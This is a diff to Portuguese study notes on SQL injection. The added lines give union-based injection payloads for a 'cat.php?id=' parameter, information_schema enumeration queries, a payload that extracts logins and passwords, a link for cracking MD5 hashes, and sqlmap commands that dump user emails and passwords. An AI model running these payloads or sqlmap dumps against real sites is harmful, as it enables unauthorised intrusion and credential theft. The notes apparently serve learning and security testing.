@@ -1,5 +1,5 @@
 O que é SQL? é uma linguagem de programação. 
-	->banco de dados feitos em sql: msql, postgresql, sqlserver, oracle
+	->banco de dados feitos em SQL: msql, postgresql, sqlserver, oracle
 	->Comandos de consultas no banco de dados: 
 	
 		- > SELECT - seleciona dados < -
@@ -62,7 +62,7 @@ Exemplo de uso de um banco de dados msql:
 		
 	observação: No exemplo supracitado, é o mesmo que fazer uma consulta no banco de dados:  
 	
-	Como seria a consulta no banco de dados pelos parametros de injeção: 					
+	Como seria a consulta no banco de dados: 					
 	
 	1 ) show databases; ( mostre os banco de dados ) 
 	2 ) use algumacoisa1; ( use o banco de dados escolhido ) 
@@ -78,13 +78,57 @@ Exemplo de uso de um banco de dados msql:
 
 	- > Feito os passos a cima iremos fazer um ataque baseado em union: 
 		fazendo injeção na url: 
+			
 			cat.php?id = 1 union select 1		
 			observação: 1 union select 1, 2, 3, 4... ( também é uma forma de descobrir quantas colunas o banco de dados possui ) 
+			
 			Por que é um ataque baseado em union ? 
-				usamos 2 select. O primeiro próprio do parametro e o segundo que passamos manualmente.
+				usamos 2 select. O primeiro é usado pela próprio url pra fazer requisição no banco de dados e o segundo que passamos 				manualmente.
 			return
 	  	You have an error in your SQL syntax; 
 
+	observação: No exemplo supracitado, é o mesmo que fazer uma consulta no banco de dados: 
+	
+	Como seria a consulta no banco de dados:
+	1 ) show databases; 
+	2 ) use algumacoisa1;
+	3 ) show tables;
+											
+	- > select * from users union select 2;				   ==				Na url: 
+											  	  		1 union select 2; 
+		return 
+		
+		id teste						 
+		-------------------------------------------
+		2 emails: <p> email: cristina@teste.com </p>
+	obs: Ao usar 1 u
+	------------------------------------------------------------------------------------------------------------------------------------------
+	- > Descobrir o nome do banco de dados, tabelas e colunas usando ataque em union ( combinação de parâmetros )
+		- 1 union select 2, database() 
+		- 1 union select 2, schema_name from information_schema.schemata
+		- 1 union select 2, group_concat(schema_name) from information_schema.schemata retorna todos os bancos de dados ( se não retornar, o 		atacante não tem privilégios suficientes para fazer )   
+		-1 union select 2, group_concat(table_name) from information_schema.tables where table_schema="nome do bancoc" ( retorna tabelas do que o banco de dados possui ) 
+		-1 union select 2, group_concat(column_name) from information_schema.columns where table_schema="nome do bancoc" and table_name="tabela"
+	
+	- > após saber o nome do banco de dados, tabelas e colunas podemos retornar ao ataque union e combinar parâmetros:
+	cat.php?id=-1 union select 2, group_concat(id, ".",login, ".",password) from bancocn.users
+	group_concat ( retorne tudo ) 
+	from bancocn.users - do banco de dados x e das tableas y
+	
+	return login and password 
+	
+		
+	
+	
+	
+	- > Como seria a consulta feita no banco de dados msql: 
+		- use information_schema;
+		- select * from schemata; 
+	
+	
+	
+	
+	-------------------------------------------------------------------------------------------------------------------------------------------
 3 ) Error-based SQLi ( ataque baseado no erro ) 
 	-> No ambiente de produção ( usuário final ), ou seja, o produto final de um programa para o cliente terá que retornar o mínimo de erros possiveis.
 	Neste tipo de ataque, é analisado todos os erros retornados a fim de obter informações sensíveis do banco de dados. 
@@ -126,4 +170,36 @@ Exemplo de uso de um banco de dados msql:
 	- > https://www.codecademy.com/catalog/language/sql
 	- > https://www.sqlcourse.com/beginner-course/
 	
+-> Quebrar senhas md5 	
+#https://md5decrypt.net/en/
+-> ferramentas para explorar vulnerabilidade sqlinjection 
+	1) sqlmap 
+	- Como usar? 
+	
+	sqlmap -r header.txt --dbs --dbms=mysql (tipo de banco, mysql, por exemplo, caso tenha essa informação extraída pelos ensinamentos supracitados) 
+	-r passe um arquivo.txt e nele coloque informações relativas a:
+	cat header.txt
+	Get /xxx HTTP/1.1
+	Host: url do site
+	User-Agent: xxxxx
+	Cookies: xxxxx
+
+--dbs é para a descoberta de banco de dados 
+--dbms=mysql é para tornar o ataque mais rápido quando você conhece a linguagem que o banco de dados utiliza 
+	
+	sqlmap -r header.txt --dbms=mysql -D (nome do banco de dados) --tables (pegar a tabela que o banco de dados possui)
+	+users 
+	+pictures 
+	+categories
+	+stats 
+	
+	sqlmap -r header.txt --dbms=mysql -D (nome do banco de dados) -T users --columns 
+	id teste 
+		--------------------------------------
+		1 users: <p> cristina_do_arrocha </p>
+		--------------------------------------
+		2 emails: <p> email: cristina@teste.com </p>
+		--------------------------------------
+		3 passwords: 
+	sqlmap -r header.txt --dbms=mysql -D (nome do banco de dados) -T users -C emails, passwords --dump 
 	
